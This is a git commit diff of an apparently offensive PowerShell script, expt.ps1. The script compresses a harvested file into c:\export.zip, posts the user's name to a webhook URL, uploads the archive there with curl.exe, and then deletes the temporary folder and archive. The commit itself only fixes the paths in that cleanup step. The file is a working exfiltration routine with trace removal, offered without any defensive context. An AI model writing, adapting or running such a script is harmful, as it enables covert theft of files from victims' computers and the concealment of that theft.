5e9fe498373e05b314170ea922b870bb60c1d54c
pedrito12a <153040660+pedrito12a@users.noreply.github.com>
2023-12-17 03:09:27 +0100

    Update expt.ps1

--- expt.ps1
+++ expt.ps1
@@ -6,5 +6,5 @@ $filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % 
 Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
 $Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
-rm -r \temp
-rm -r \export.zip
+rm -r C:\temp
+rm -r C:\export.zip
